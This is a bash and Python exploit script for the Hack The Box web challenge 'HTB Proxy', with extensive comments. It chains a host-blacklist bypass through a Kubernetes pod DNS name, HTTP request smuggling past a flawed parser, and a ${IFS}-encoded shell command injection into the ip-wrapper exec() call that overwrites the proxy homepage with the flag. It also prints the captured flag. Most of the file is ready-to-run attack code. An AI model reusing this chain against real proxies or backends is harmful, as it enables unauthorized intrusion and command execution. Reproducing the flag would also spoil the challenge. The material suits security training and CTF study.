#!/usr/bin/env bash

set -euo pipefail

# Challenge: HTB Proxy
# Category: Web
# Platform: Hack The Box CTF Try Out
#
# Scenario summary:
# The target exposes a custom HTTP proxy. The source code shows a hidden backend
# service with two routes:
#   1. POST /getAddresses
#   2. POST /flushInterface
#
# The backend route /flushInterface is dangerous because it passes user input
# into the npm package "ip-wrapper", and that package uses child_process.exec()
# with the interface name inserted directly into a shell command:
#
#   ip address flush dev <user_input>
#
# That means command injection is possible.
#
# Real-world concept:
# This is a chain exploit, which is common in web security:
#   - Step 1: bypass proxy routing restrictions
#   - Step 2: bypass request filtering
#   - Step 3: exploit backend command injection
#   - Step 4: move the sensitive file into a place we can read back safely
#
# Why we do not simply "cat /flag" and expect it in the HTTP response:
# The backend route /flushInterface returns only a generic success/error JSON
# response. Even if the command runs, its stdout is not reflected back to us in a
# useful way. So instead, we overwrite the proxy's static homepage file with the
# flag, then request "/" and read the flag from there.
#
# Key observations from the source:
#
# 1. The proxy blocks hosts that contain these raw substrings:
#      localhost, 0.0.0.0, 127., 172., 192., 10.
#    But it only checks the raw Host string, not the IP after DNS resolution.
#
# 2. The /server-status route reveals the pod IP:
#      10.244.40.71
#
# 3. Kubernetes pod DNS lets us reference that IP in a dash-encoded hostname:
#      10-244-40-71.default.pod.cluster.local
#    This avoids the raw "10." blacklist while still resolving to the internal
#    backend.
#
# 4. The proxy blocks URLs containing "flushinterface", but only for the first
#    parsed request. The parser is flawed because it splits the whole request on
#    every "\r\n\r\n". We can therefore smuggle a second request after an empty
#    first body.
#
# Smuggling layout:
#   POST /getAddresses HTTP/1.1
#   Host: internal-backend
#   Content-Length: 0
#   Content-Type: application/json
#
#   <empty body>
#
#   POST /flushInterface HTTP/1.1
#   Host: internal-backend
#   Content-Type: application/json
#   Content-Length: ...
#
#   {"interface":";cat${IFS}/flag*.txt>/app/proxy/includes/index.html"}
#
# Why ${IFS} is used:
# The backend input validator rejects literal spaces in the interface name.
# ${IFS} expands to shell whitespace when exec() invokes /bin/sh -c internally.
#
# Manual commands / logic:
#
# 1. Confirm the pod IP:
#      curl or raw GET to /server-status
#
# 2. Route to the backend using:
#      Host: 10-244-40-71.default.pod.cluster.local:5000
#
# 3. Smuggle a second POST request to /flushInterface
#
# 4. Command injection payload:
#      ;cat${IFS}/flag*.txt>/app/proxy/includes/index.html
#
# 5. Request "/" from the proxy and extract the flag
#
# Flag obtained on this instance:
# HTB{r3inv3nting_th3_wh331_c4n_cr34t3_h34dach35_41808acdd4d47662f43de96acebc2b31}

PROXY_IP="${1:-154.57.164.77}"
PROXY_PORT="${2:-30909}"
POD_IP="${3:-10.244.40.71}"

BACKEND_HOST="${POD_IP//./-}.default.pod.cluster.local:5000"
INJECT_CMD=';cat${IFS}/flag*.txt>/app/proxy/includes/index.html'
SECOND_BODY='{"interface": "'"${INJECT_CMD}"'"}'

send_smuggle() {
  python3 - "$PROXY_IP" "$PROXY_PORT" "$BACKEND_HOST" "$SECOND_BODY" <<'PY'
import socket
import sys

proxy_ip = sys.argv[1]
proxy_port = int(sys.argv[2])
backend_host = sys.argv[3]
second_body = sys.argv[4]

smuggled = (
    "POST /flushInterface HTTP/1.1\r\n"
    f"Host: {backend_host}\r\n"
    "Content-Type: application/json\r\n"
    f"Content-Length: {len(second_body)}\r\n"
    "\r\n"
    f"{second_body}"
)

outer = (
    "POST /getAddresses HTTP/1.1\r\n"
    f"Host: {backend_host}\r\n"
    "Content-Length: 0\r\n"
    "Content-Type: application/json\r\n"
    "\r\n\r\n\r\n"
    f"{smuggled}"
).encode()

s = socket.socket()
s.settimeout(2)
s.connect((proxy_ip, proxy_port))
s.sendall(outer)
s.close()
PY
}

fetch_flag() {
  python3 - "$PROXY_IP" "$PROXY_PORT" <<'PY'
import re
import socket
import sys

proxy_ip = sys.argv[1]
proxy_port = int(sys.argv[2])

s = socket.socket()
s.settimeout(4)
s.connect((proxy_ip, proxy_port))
s.sendall(b"GET / HTTP/1.1\r\nHost: x:1\r\nConnection: close\r\n\r\n")

response = b""
try:
    while True:
        chunk = s.recv(4096)
        if not chunk:
            break
        response += chunk
except Exception:
    pass
finally:
    s.close()

text = response.decode("latin1", "ignore")
match = re.search(r"HTB\{[^}]+\}", text)
if match:
    print(match.group(0))
PY
}

# Send the smuggling trigger a few times to make the exploit reliable on live
# infrastructure, where timing and socket handling can vary slightly.
for _ in 1 2 3 4 5; do
  send_smuggle || true
  sleep 0.5
done

# Poll the homepage until the injected command has overwritten the static file.
for _ in $(seq 1 12); do
  FLAG="$(fetch_flag || true)"
  if [[ "${FLAG}" == HTB\{* ]]; then
    printf '%s\n' "$FLAG"
    exit 0
  fi
  sleep 1
done

echo "Exploit sent, but flag was not observed yet. Re-run the script against the live instance." >&2
exit 1
